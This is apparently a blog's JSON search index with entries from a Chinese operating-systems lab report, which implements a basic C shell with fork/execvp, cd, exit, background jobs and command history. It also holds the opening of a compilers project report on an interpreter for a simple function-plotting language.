[{"categories":["操作系统","计算机体系结构"],"content":" 实验题目Project 1—UNIX Shell and History Feature This project consists of designing a C program to serve as a shell interface that accepts user commands and then executes each command in a separate process. This project can be completed on any Linux, UNIX, or Mac OS X system. A shell interface gives the user a prompt, after which the next command is entered. The example below illustrates the prompt osh\u003e and the user’s next command: cat prog.c. (This command displays the file prog.c on the terminal using the UNIX cat command.) osh\u003e cat prog.c One technique for implementing a shell interface is to have the parent process first read what the user enters on the command line (in this case, cat prog.c), and then create a separate child process that performs the command. Unless otherwise specified, the parent process waits for the child to exit before continuing. This is similar in functionality to the new process creation illustrated in Figure 3.10. However, UNIX shells typically also allow the child process to run in the background, or concurrently. To accomplish this, we add an ampersand (\u0026) at the end of the command. Thus, if we rewrite the above command as osh\u003e cat prog.c \u0026 the parent and child processes will run concurrently. The separate child process is created using the fork() system call, and the user’s command is executed using one of the system calls in the exec() family (as described in Section 3.3.1). A C program that provides the general operations of a command-line shell is supplied in Figure 3.36. The main() function presents the prompt osh-\u003e and outlines the steps to be taken after input from the user has been read. The main() function continually loops as long as should run equals 1; when the user enters exit at the prompt, your program will set should run to 0 and terminate. This project is organized into two parts: (1) creating the child process and executing the command in the child, and (2) modifying the shell to allow a history feature. ","date":"2023-03-31","objectID":"/posts/oslab2/:1:0","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#实验题目"},{"categories":["操作系统","计算机体系结构"],"content":" 相关原理与知识（完成实验所用到的相关原理与知识）Linux 进程相关基础知识。 Linux下C语言编程。 如何使用终端颜色控制字符调整终端输出字符的颜色。 命令行解析。 ","date":"2023-03-31","objectID":"/posts/oslab2/:2:0","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#相关原理与知识完成实验所用到的相关原理与知识"},{"categories":["操作系统","计算机体系结构"],"content":" 实验过程（清晰展示实际操作过程，相关截图及解释）","date":"2023-03-31","objectID":"/posts/oslab2/:3:0","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#实验过程清晰展示实际操作过程相关截图及解释"},{"categories":["操作系统","计算机体系结构"],"content":" 模型归纳一个典型的shell可以简化为以下形式： while(1) { init(); read_command(); int pid = fork(); if(pid \u003c 0) { puts(\"Unable to fork the child, inner error.\"); } else if(pid == 0) // the child thread { execve(command); //execve the command } else // the parent thread { wait(NULL); //waiting for the child to exit } } 当在shell中进行输入时，fork()出子进程来执行我们的输入，父进程则等待我们的子进程执行完成。 美化实现通过查阅终端颜色控制符实现几个函数，用于打印彩色字符。 void PrintBlue(char *ch) { printf(\"\\033[1;34m%s\\033[0m\", ch); } void PrintRed(char *ch) { printf(\"\\033[1;31m%s\\033[0m\", ch); } void PrintPink(char *ch) { printf(\"\\033[1;35m%s\\033[0m\", ch); } 通过getcwd函数，加上一个小的parser实现获取当前文件夹名称。 void PrintCurrentDir() { char tmp[114]; int tcnt = 0; char *cwd = getcwd(NULL, 0); int cur = strlen(cwd) - 1; while (cwd[cur] != '/') { tmp[tcnt++] = cwd[cur]; cur--; } for (int i = 0; i \u003c tcnt/2;i++) { char c = tmp[i]; tmp[i] = tmp[tcnt - i - 1]; tmp[tcnt - i - 1] = c; } tmp[tcnt] = 0; PrintPink(tmp); } 最终效果如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:1","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#模型归纳"},{"categories":["操作系统","计算机体系结构"],"content":" 模型归纳一个典型的shell可以简化为以下形式： while(1) { init(); read_command(); int pid = fork(); if(pid \u003c 0) { puts(\"Unable to fork the child, inner error.\"); } else if(pid == 0) // the child thread { execve(command); //execve the command } else // the parent thread { wait(NULL); //waiting for the child to exit } } 当在shell中进行输入时，fork()出子进程来执行我们的输入，父进程则等待我们的子进程执行完成。 美化实现通过查阅终端颜色控制符实现几个函数，用于打印彩色字符。 void PrintBlue(char *ch) { printf(\"\\033[1;34m%s\\033[0m\", ch); } void PrintRed(char *ch) { printf(\"\\033[1;31m%s\\033[0m\", ch); } void PrintPink(char *ch) { printf(\"\\033[1;35m%s\\033[0m\", ch); } 通过getcwd函数，加上一个小的parser实现获取当前文件夹名称。 void PrintCurrentDir() { char tmp[114]; int tcnt = 0; char *cwd = getcwd(NULL, 0); int cur = strlen(cwd) - 1; while (cwd[cur] != '/') { tmp[tcnt++] = cwd[cur]; cur--; } for (int i = 0; i \u003c tcnt/2;i++) { char c = tmp[i]; tmp[i] = tmp[tcnt - i - 1]; tmp[tcnt - i - 1] = c; } tmp[tcnt] = 0; PrintPink(tmp); } 最终效果如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:1","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#美化实现"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#核心功能实现"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#解析输入命令"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#实现cd命令与exit命令"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#实现命令执行"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#实现历史记录功能"},{"categories":["操作系统","计算机体系结构"],"content":" 核心功能实现 解析输入命令 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。 实现cd命令与exit命令 if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \"exit\") == 0) { printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。 实现命令执行 if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026参数，则父进程无需等待子进程结束。 实现历史记录功能 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。 测试程序测试截图如下： ","date":"2023-03-31","objectID":"/posts/oslab2/:3:2","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#测试程序"},{"categories":["操作系统","计算机体系结构"],"content":" 问题分析与总结实验中遇到的问题较少，学到了如何控制终端输出彩色字符。 要注意使用前先malloc分配内存，在不用时及时free，避免段错误或内存泄露。 ","date":"2023-03-31","objectID":"/posts/oslab2/:4:0","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#问题分析与总结"},{"categories":["操作系统","计算机体系结构"],"content":" 完整代码 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e #include \u003cunistd.h\u003e #define MAX_ARGS 114 // 支持的输入变量个数 #define MAX_ARGS_LEN 114 // 单个变量的长度 #define FLAG_EXECVE_WAIT 0 #define FLAG_EXECVE_NOTWAIT 1 #define MAX_HISTORY 114 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; void PrintBlue(char *ch) { printf(\"\\033[1;34m%s\\033[0m\", ch); } void PrintRed(char *ch) { printf(\"\\033[1;31m%s\\033[0m\", ch); } void PrintPink(char *ch) { printf(\"\\033[1;35m%s\\033[0m\", ch); } void PrintCurrentDir() { char tmp[114]; int tcnt = 0; char *cwd = getcwd(NULL, 0); int cur = strlen(cwd) - 1; while (cwd[cur] != '/') { tmp[tcnt++] = cwd[cur]; cur--; } for (int i = 0; i \u003c tcnt/2;i++) { char c = tmp[i]; tmp[i] = tmp[tcnt - i - 1]; tmp[tcnt - i - 1] = c; } tmp[tcnt] = 0; PrintPink(tmp); } int main() { char *args[MAX_ARGS]; char *buffer = (char *)malloc(MAX_ARGS_LEN * MAX_ARGS); int args_count = 0; int flag = 0; history his; his.his_count = 0; printf(\"\\033[1;33mWelcome to z-shell!\\033[0m\\n\"); PrintPink(\" _ _ _ \\n\"); PrintPink(\" ____ ___| |__ ___| | |\\n\"); PrintPink(\"|_ /____/ __| '_ \\\\ / _ \\\\ | |\\n\"); PrintPink(\" / /_____\\\\__ \\\\ | | | __/ | |\\n\"); PrintPink(\"/___| |___/_| |_|\\\\___|_|_|\\n\"); printf(\"\\n\\n\"); while (1) { PrintBlue(\"[z-shell]$ -\u003e \"); PrintCurrentDir(); putchar(' '); fflush(stdout); fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); PARSER:; FILE *fp = fmemopen(buffer, strlen(buffer), \"r\"); for (int i = 0; i \u003c args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \"%s\", args[args_count]); if (fl \u003c 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; if (strcmp(args[0], \"!!\") == 0) { if (his.his_count == 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \"!\") == 0) { if (args_count == 1) { PrintRed(\"z-shell: please input number!\\n\"); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\"z-shell: number illegal!\\n\"); continue; } int cur = his.his_count - num + 1; if (cur \u003c= 0) { PrintRed(\"z-shell: no commands in history!\\n\"); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } if (strcmp(args[0], \"exit\") == 0) { // 退出 printf(\"Bye bye! Thanks to use z-shell!\\n\"); fflush(stdout); break; } if (strcmp(args[0], \"cd\") == 0) { if (chdir(args[1]) == -1) { PrintRed(\"z-shell: error!\\n\"); fflush(stdout); continue; } else { PrintBlue(\"z-shell: you are now in \"); printf(\"%s\\n\", args[1]); fflush(stdout); } continue; } if (strcmp(args[args_count - 1], \"\u0026\") == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\"z-shell: an error occurred while forking\\n\"); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\"z-shell: unable to execute the programme \"); printf(\"%s.\\n\", args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); his.his_count++; his.buf[his.his_count] = (char *)malloc(MAX_ARGS * MAX_ARGS_LEN); strcpy(his.buf[his.his_count], buffer); } return 0; } ","date":"2023-03-31","objectID":"/posts/oslab2/:4:1","series":null,"tags":null,"title":"实现一个自己的shell（操作系统Lab2）","uri":"/posts/oslab2/#完整代码"},{"categories":null,"content":" 1. 上机题目简介 上机实验的目的通过做上机题加深对编译器构造原理和方法的理解，巩固所学知识。 会用正规式和产生式设计简单语言的语法； 会用递归下降子程序编写编译器或解释器； 上机题目 - 简单函数绘图语言的解释器 实现简单函数绘图的语句 循环绘图（FOR-DRAW） 比例设置（SCALE） 角度旋转（ROT） 坐标平移（ORIGIN） 屏幕（窗口）的坐标系 左上角为原点 x方向从左向右增长 y方向从上到小增长（与一般的坐标系方向相反） 函数绘图源程序举例 --------------- 函数f(t)=t的图形 origin is (100, 300); -- 设置原点的偏移量 rot is 0; -- 设置旋转角度(不旋转) scale is (1, 1); -- 设置横坐标和纵坐标的比例 for T from 0 to 200 step 1 draw (t, 0); -- 横坐标的轨迹（纵坐标为0） for T from 0 to 150 step 1 draw (0, -t); -- 纵坐标的轨迹（横坐标为0） for T from 0 to 120 step 1 draw (t, -t); -- 函数f(t)=t的轨迹 默认值： origin is (0, 0) rot is 0; scale is (1, 1) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:1","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#1-上机题目简介"},{"categories":null,"content":" 1. 上机题目简介 上机实验的目的通过做上机题加深对编译器构造原理和方法的理解，巩固所学知识。 会用正规式和产生式设计简单语言的语法； 会用递归下降子程序编写编译器或解释器； 上机题目 - 简单函数绘图语言的解释器 实现简单函数绘图的语句 循环绘图（FOR-DRAW） 比例设置（SCALE） 角度旋转（ROT） 坐标平移（ORIGIN） 屏幕（窗口）的坐标系 左上角为原点 x方向从左向右增长 y方向从上到小增长（与一般的坐标系方向相反） 函数绘图源程序举例 --------------- 函数f(t)=t的图形 origin is (100, 300); -- 设置原点的偏移量 rot is 0; -- 设置旋转角度(不旋转) scale is (1, 1); -- 设置横坐标和纵坐标的比例 for T from 0 to 200 step 1 draw (t, 0); -- 横坐标的轨迹（纵坐标为0） for T from 0 to 150 step 1 draw (0, -t); -- 纵坐标的轨迹（横坐标为0） for T from 0 to 120 step 1 draw (t, -t); -- 函数f(t)=t的轨迹 默认值： origin is (0, 0) rot is 0; scale is (1, 1) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:1","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#上机实验的目的"},{"categories":null,"content":" 1. 上机题目简介 上机实验的目的通过做上机题加深对编译器构造原理和方法的理解，巩固所学知识。 会用正规式和产生式设计简单语言的语法； 会用递归下降子程序编写编译器或解释器； 上机题目 - 简单函数绘图语言的解释器 实现简单函数绘图的语句 循环绘图（FOR-DRAW） 比例设置（SCALE） 角度旋转（ROT） 坐标平移（ORIGIN） 屏幕（窗口）的坐标系 左上角为原点 x方向从左向右增长 y方向从上到小增长（与一般的坐标系方向相反） 函数绘图源程序举例 --------------- 函数f(t)=t的图形 origin is (100, 300); -- 设置原点的偏移量 rot is 0; -- 设置旋转角度(不旋转) scale is (1, 1); -- 设置横坐标和纵坐标的比例 for T from 0 to 200 step 1 draw (t, 0); -- 横坐标的轨迹（纵坐标为0） for T from 0 to 150 step 1 draw (0, -t); -- 纵坐标的轨迹（横坐标为0） for T from 0 to 120 step 1 draw (t, -t); -- 函数f(t)=t的轨迹 默认值： origin is (0, 0) rot is 0; scale is (1, 1) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:1","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#上机题目---简单函数绘图语言的解释器"},{"categories":null,"content":" 2. 开发环境及配置环境：GNU-g++ 9.4.0/Python 3.9 tkinter 文本编辑器：Visual Studio Code 构建工具：GNU make 代码仓库地址：https://github.com/zeroy0410/GraphCompiler 图形库依赖需要运行环境下存在Python以及tkinter图形库。 编译：在代码所在目录，运行命令： make 使用 ./GraphCompiler [ObjectFile] (可选参数\"test\"测试词法分析器) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:2","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#2-开发环境及配置"},{"categories":null,"content":" 2. 开发环境及配置环境：GNU-g++ 9.4.0/Python 3.9 tkinter 文本编辑器：Visual Studio Code 构建工具：GNU make 代码仓库地址：https://github.com/zeroy0410/GraphCompiler 图形库依赖需要运行环境下存在Python以及tkinter图形库。 编译：在代码所在目录，运行命令： make 使用 ./GraphCompiler [ObjectFile] 